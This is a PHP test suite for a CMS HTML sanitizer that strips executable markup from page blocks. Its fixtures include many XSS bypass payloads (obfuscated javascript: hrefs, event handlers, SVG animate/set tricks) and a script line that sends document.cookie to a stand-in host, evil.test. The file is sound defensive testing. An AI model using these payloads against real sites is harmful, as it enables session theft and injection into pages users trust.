<?php

declare(strict_types=1);

use App\Enums\ContentStatus;
use App\Models\Page;
use App\Services\BlockHtmlSanitizer;

it('leaves content that carries no dangerous markup byte-identical', function (string $value): void {
    expect(BlockHtmlSanitizer::value($value))->toBe($value);
})->with([
    'rich text' => ['<p>Tips &amp; Tricks</p>'],
    'design classes and anchor' => ['<div class="wu-prose wu-h2" id="v0-1-1"><p>hi</p></div>'],
    'plain text with an ampersand' => ['Tips & Tricks'],
    'colour token' => ['#ffffff'],
    'ordinary link' => ['<a href="https://wire-up.dev" class="wu-link">docs</a>'],
    'inline image' => ['<img src="/media/shot.png" alt="a shot">'],
    'prose that mentions a script scheme' => ['<p>Learn javascript: the good parts</p>'],
    'empty string' => [''],
]);

it('removes markup that can execute', function (string $value, string $expected): void {
    expect(BlockHtmlSanitizer::value($value))->toBe($expected);
})->with([
    'script tag' => ['<p>a</p><script>bad()</script>', '<p>a</p>'],
    'uppercase script tag' => ['<SCRIPT>bad()</SCRIPT>', ''],
    'script nested in svg' => ['<svg><script>bad()</script></svg>', '<svg></svg>'],
    'iframe' => ['<iframe src="//evil.test"></iframe>', ''],
    'object' => ['<object data="//evil.test"></object>', ''],
    'inline style block' => ['<style>body{display:none}</style><p>a</p>', '<p>a</p>'],
    'event handler attribute' => ['<img src="x" onerror="alert(1)">', '<img src="x">'],
    'mixed case event handler' => ['<p OnMouseOver="alert(1)">a</p>', '<p>a</p>'],
    'javascript href' => ['<a href="javascript:alert(1)">x</a>', '<a>x</a>'],
    'vbscript href' => ['<a href="vbscript:msgbox(1)">x</a>', '<a>x</a>'],
    'html data uri src' => ['<img src="data:text/html;base64,PHN2Zz4=">', '<img>'],
    'handler glued to the previous attribute' => ['<img src="x"onerror="alert(1)">', '<img src="x">'],
    'entity encoded javascript href' => ['<a href="&#106;avascript:alert(1)">x</a>', '<a>x</a>'],
    'named entity colon' => ['<a href="&#x6A;avascript&colon;alert(1)">x</a>', '<a>x</a>'],
    'tab inside the scheme' => ["<a href=\"java\tscript:alert(1)\">x</a>", '<a>x</a>'],
    'newline before the scheme' => ["<a href=\" \n javascript:alert(1)\">x</a>", '<a>x</a>'],
    'svg xlink href' => ['<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>', '<svg><a><text>x</text></a></svg>'],
    'svg animate rewriting an href' => ['<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>', '<svg><a><text>x</text></a></svg>'],
    'svg set rewriting an href' => ['<svg><set attributeName="xlink:href" to="0;javascript:alert(1)"/></svg>', '<svg></svg>'],
    'markup escaping a wrapper element' => ['<p>ok</p></div><img src=x onerror=alert(1)>', '<p>ok</p><img src="x">'],
    'second body tag carrying a handler' => ['<body onload=alert(1)><p>x</p>', '<p>x</p>'],
    'form with fields inside' => ['<p>a</p><form action="//evil.test"><input name="password" onfocus="alert(1)"></form>', '<p>a</p>'],
]);

it('blanks a bare url that would execute when clicked', function (): void {
    expect(BlockHtmlSanitizer::value('javascript:alert(1)'))->toBeEmpty()
        ->and(BlockHtmlSanitizer::value('  JavaScript:alert(1)'))->toBeEmpty()
        ->and(BlockHtmlSanitizer::value("java\tscript:alert(1)"))->toBeEmpty()
        ->and(BlockHtmlSanitizer::value('data:text/html,<script>bad()</script>'))->toBeEmpty();
});

it('keeps an inline image data uri, which cannot execute', function (): void {
    expect(BlockHtmlSanitizer::value('data:image/png;base64,AAA'))->toBe('data:image/png;base64,AAA');
});

it('sanitizes every string in a nested content array and leaves other types alone', function (): void {
    $sanitized = BlockHtmlSanitizer::content([
        'body' => ['en' => '<p>ok</p><script>bad()</script>'],
        'items' => [['url' => 'javascript:alert(1)', 'title' => 'Safe']],
        'imageHeight' => 240,
        'framed' => true,
        'caption' => null,
    ]);

    expect($sanitized)->toBe([
        'body' => ['en' => '<p>ok</p>'],
        'items' => [['url' => '', 'title' => 'Safe']],
        'imageHeight' => 240,
        'framed' => true,
        'caption' => null,
    ]);
});

it('is idempotent, so repeated saves do not keep rewriting content', function (): void {
    $once = BlockHtmlSanitizer::value('<p>Tips & Tricks</p><script>bad()</script>');

    expect(BlockHtmlSanitizer::value($once))->toBe($once);
});

it('strips a script an agent writes into a block before it reaches the public page', function (): void {
    $page = Page::factory()->create([
        'status' => ContentStatus::PUBLISHED,
        'published_at' => now()->subDay(),
        'metadata' => ['published_locales' => ['en']],
    ]);
    $page->slugs()->create(['locale' => 'en', 'slug' => 'agent-written']);

    $page->updateBlocks([[
        'id' => 'new-1',
        'type' => 'rich-text',
        'content' => ['body' => ['en' => '<p>Legitimate copy.</p><script>fetch("//evil.test?c="+document.cookie)</script>']],
    ]]);

    $this->get('/agent-written')
        ->assertOk()
        ->assertSee('Legitimate copy.')
        ->assertDontSee('<script>fetch', false);

    expect($page->blocks()->first()?->content['body']['en'])->toBe('<p>Legitimate copy.</p>');
});

it('leaves a code block sample verbatim, because it renders escaped', function (): void {
    $sample = "<?php\necho 'hi <script>';";

    expect(BlockHtmlSanitizer::forBlock('code', ['code' => $sample]))->toBe(['code' => $sample]);
});

it('still sanitizes the heading and intro of a code block, which render raw', function (): void {
    $sanitized = BlockHtmlSanitizer::forBlock('code', [
        'code' => '<script>kept()</script>',
        'heading' => ['en' => 'Install<script>bad()</script>'],
        'intro' => ['en' => '<p>Run it.</p><iframe src="//evil.test"></iframe>'],
    ]);

    expect($sanitized)->toBe([
        'code' => '<script>kept()</script>',
        'heading' => ['en' => 'Install'],
        'intro' => ['en' => '<p>Run it.</p>'],
    ]);
});

it('sanitizes every field of a block type with nothing held verbatim', function (): void {
    expect(BlockHtmlSanitizer::forBlock('rich-text', ['body' => '<p>a</p><script>bad()</script>']))
        ->toBe(['body' => '<p>a</p>']);
});
